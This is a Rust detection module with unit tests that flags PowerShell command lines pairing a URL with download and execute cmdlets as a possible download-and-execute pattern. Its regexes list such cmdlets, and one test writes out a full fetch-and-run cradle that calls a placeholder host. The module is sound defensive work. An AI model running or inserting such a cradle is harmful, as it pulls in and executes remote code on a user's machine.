//! Conservative command-pattern hints, not a PowerShell interpreter or malware verdict.
use regex::Regex;
use std::sync::OnceLock;

pub(super) fn command_assessment(value: &str) -> Option<(&'static str, &'static str)> {
    let (_, launcher) = super::resolver::command_target(value);
    let name = launcher
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    if !matches!(
        name.as_str(),
        "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
    ) {
        return None;
    }
    static PATTERNS: OnceLock<(Regex, Regex)> = OnceLock::new();
    let (download, execute) = PATTERNS.get_or_init(|| (
        Regex::new(r"(?i)\b(downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|iwr|irm)\b").unwrap(),
        Regex::new(r"(?i)\b(invoke-expression|iex|start-process)\b").unwrap(),
    ));
    let lower = value.to_ascii_lowercase();
    if (lower.contains("http://") || lower.contains("https://"))
        && download.is_match(value)
        && execute.is_match(value)
    {
        Some((
            "MEDIUM",
            "Static PowerShell download-and-execute pattern; review context, not proof of malicious execution",
        ))
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn ordinary_admin_commands_do_not_match_the_combined_hint() {
        for value in [
            r"powershell.exe -File C:\Corp\Configure.ps1",
            r"cmd.exe /c msiexec /i C:\Corp\agent.msi /quiet",
            "powershell.exe -c Invoke-WebRequest https://example.test/config.json -OutFile config.json",
            "powershell.exe -c Start-Process notepad.exe",
        ] {
            assert!(command_assessment(value).is_none(), "{value}");
        }
        assert!(command_assessment("powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/stage')").is_some());
    }
}
